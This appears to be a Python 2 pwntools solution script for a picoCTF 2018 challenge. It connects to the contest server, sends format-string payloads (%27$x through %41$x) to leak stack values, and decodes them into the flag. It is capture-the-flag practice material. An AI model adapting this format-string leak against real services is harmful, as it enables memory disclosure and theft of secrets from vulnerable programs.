#!/usr/bin/python
from pwn import *
import re

encFlag = ''
s = remote('2018shell1.picoctf.com', 46960)
stage1 = ' '.join(['%{}$x'.format(i) for i in range(27, 37)])
print s.recvuntil('>'), stage1
s.sendline(stage1)
flag1 = s.recvuntil('\n').strip()
log.info('Flag Part 1: {}'.format(flag1))

stage2 = ' '.join(['%{}$x'.format(i) for i in range(37, 42)])
print '>', stage2
s.sendline(stage2)
flag2 = s.recvuntil('\n').replace('>', '').strip()
log.info('Flag Part 2: {}'.format(flag2))

encFlag = flag1 + ' ' + flag2

flag = ''
for i in encFlag.split(' '):
	flag += p32(int(i, 16))

log.success('Flag: ' + re.findall(r'(picoCTF\{.+\})', flag)[0])
